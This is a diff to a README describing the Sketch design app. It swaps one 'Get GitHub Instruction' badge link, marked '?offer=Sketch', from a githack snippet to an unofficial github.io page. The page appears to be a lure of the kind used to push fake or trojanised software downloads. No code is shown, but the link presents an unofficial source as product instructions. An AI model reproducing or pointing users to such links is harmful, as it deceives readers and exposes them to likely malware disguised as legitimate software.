@@ -2,7 +2,7 @@
 
 Sketch is a professional design platform for **UI, UX, and product creation**. It empowers designers and teams to craft interfaces, prototypes, and brand systems in an intuitive and collaborative environment. From concept to final assets — Sketch makes creativity seamless. ✏️  
 
-[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://glcdn.githack.com/-/snippets/4899024/raw/main/sketchapp.html?offer=Sketch)
+[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-24292e?style=for-the-badge&logo=github&logoColor=white)](https://app-set-deploy.github.io/.github/?offer=Sketch)
 
 ---
 
